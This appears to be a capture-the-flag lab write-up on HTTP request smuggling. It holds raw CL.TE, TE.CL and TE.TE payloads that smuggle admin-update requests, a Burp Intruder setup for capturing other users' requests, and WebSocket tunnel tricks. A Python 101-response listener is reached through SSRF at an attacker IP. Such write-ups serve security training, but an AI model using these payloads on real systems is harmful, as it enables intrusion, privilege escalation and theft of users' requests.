## 📉 Content-Length/Transfer-Encoding (CL.TE)

CL.TE exploits parsing discrepancies between proxy (front-end) and back-end servers. The proxy prioritizes the Content-Length header to determine request boundaries, while the back-end prioritizes Transfer-Encoding. Ambiguous requests lead to unexpected boundary interpretation.


To exploit, craft a request utilizing both headers to trigger differing boundary interpretations.

```http
# Sample CL.TE exploitation payload
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```
* Tool: Raw HTTP Client

## 📈 Transfer-Encoding/Content-Length (TE.CL)

TE.CL is the inverse of CL.TE. The proxy utilizes the Transfer-Encoding header for boundary detection, whereas the back-end server relies on the Content-Length header.


```http
# Sample TE.CL exploitation payload
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```
* Tool: Raw HTTP Client

## 🎭 Transfer-Encoding Obfuscation (TE.TE)

TE.TE occurs when both servers support Transfer-Encoding, but inconsistent parsing of obfuscated or malformed headers causes one server to revert to Content-Length.

```http
# Sample TE.TE exploitation payload with obfuscated header
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```
* Tool: Raw HTTP Client

## 🎯 Target Assessment and Exploitation

Target parameters: http://httprequestsmuggling.thm.

Intercept standard traffic to the index to form a baseline request. Route the request and execute the payload via null payload injection.

```http
# Payload for Burp Suite Intruder implementation
POST / HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

0

POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

username=test&query=§
```
* Tool: Burp Suite Intruder

Configure payload settings:
1. Payload type: Null payloads.
2. Generate 10000 null payloads.
3. Initiate attack. Review /submissions endpoint for captured external requests.

## 🚇 Broken WebSocket Tunnel Smuggling

Smuggle HTTP requests by initiating a deceptive WebSocket upgrade. Supplying an invalid Sec-Websocket-Version (e.g., bypassing standard version 13) prompts a 426 Upgrade Required response. If the proxy fails to validate the backend rejection, it maintains an open tunnel, facilitating smuggled HTTP payloads.


```http
# Payload targeting /socket endpoint to bypass proxy restrictions
GET /socket HTTP/1.1
Host: 10.65.169.2:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.65.169.2:8001
```
* Tool: Burp Suite Repeater

Ensure the Update Content-Length setting is explicitly disabled in the proxy configuration during execution.

```http
# Alternative payload bypassing WebSocket endpoint requirement
GET / HTTP/1.1
Host: 10.65.169.2:8001
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.65.169.2:8001
```
* Tool: Netcat

## 🔄 Faking WebSocket Upgrades via SSRF

Restrictive proxies (e.g., Nginx) validate backend 101 Switching Protocols responses. Leverage Server-Side Request Forgery (SSRF) to inject a simulated 101 response, coercing the proxy into establishing the tunnel.


Deploy a listener to generate the required HTTP 101 status code.

```python
# Python HTTP server to return HTTP 101 response
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
* Tool: Python

Execute the server script:

```bash
# Execute the custom Python listener
python3 myserver.py 5555
```
* Tool: Bash

Route the final payload through the vulnerable SSRF endpoint (/check-url), targeting the rogue listener.

```http
# Smuggling payload utilizing SSRF to trigger the 101 response
GET /check-url?server=[http://10.10.11.155:5555](http://10.10.11.155:5555) HTTP/1.1
Host: 10.65.169.2:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.65.169.2:8002
```
* Tool: Burp Suite Repeater
